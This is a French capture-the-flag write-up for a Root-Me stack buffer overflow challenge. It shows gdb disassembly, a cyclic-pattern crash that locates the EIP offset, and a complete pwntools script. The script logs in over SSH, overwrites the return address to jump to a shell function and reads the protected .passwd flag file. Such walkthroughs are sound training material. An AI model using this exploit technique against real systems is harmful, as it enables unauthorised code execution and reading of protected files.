On va utiliser "pwn" en python3

On cherche l’adresse de la fonction shell :
```
gdb$ disass shell
Dump of assembler code for function shell:
  0x08048464 <+0>:    push   %ebp
   ...
  0x08048477 <+19>:    ret    
End of assembler dump.
```
On retiendra 0x08048464 (début de l’exécution)
```
gdb$ disass main
Dump of assembler code for function main:
  0x0804848c <+0>:    push   ebp
   ....
  0x080484c9 <+61>:    leave  
  0x080484ca <+62>:    ret    
End of assembler dump.
```
Lorsque que l’on fait un breakpoint avant "ret", on se situe avant l’execution de l’EIP. Si on remplace l’adresse que contient EIP, on execute le code contenu à cette adresse à la fin de l’exécution du programme. En utilisant "pwn.cyclic(200)" on cherche ce que contient eip
```
gdb$ b *0x080484ca
Breakpoint 1 at 0x80484ca
gdb$ run
Starting program: /challenge/app-systeme/ch15/ch15
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------[regs]
 EAX: 0x62616168  EBX: 0xB7FD0000  ECX: 0xBFFFFB1C  EDX: 0xB7FD18A4  o d I t S z a p c
 ESI: 0x00000000  EDI: 0x00000000  EBP: 0xBFFFFBA8  ESP: 0xBFFFFAFC  EIP: 0x62616168
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007BError while running hook_stop:
Cannot access memory at address 0x62616168
0x62616168 in ?? ()
```
On peut alors aller cherche le flag avec le programme suivant :
```
#! /usr/bin/env python3
import pwn
 
s = pwn.ssh('app-systeme-ch15',
            'challenge02.root-me.org',
            password='app-systeme-ch15',
            port=2222)
 
p = s.process('ch15')
n = pwn.cyclic_find(0x62616168)
p.sendline((b'A'*n)[:n]+pwn.p32(0x08048464))
p.sendline(b'cat .passwd')
print(p.recvline())
p.close()
s.close()
```

On obtient :
```
[+] Connecting to challenge02.root-me.org on port 2222: Done
[+] Opening new channel: execve(b'ch15', [b'ch15'], os.environ): Done
b'$ FLAG censuré\n'
[*] Closed SSH channel with challenge02.root-me.org
[*] Closed connection to 'challenge02.root-me.org'
```
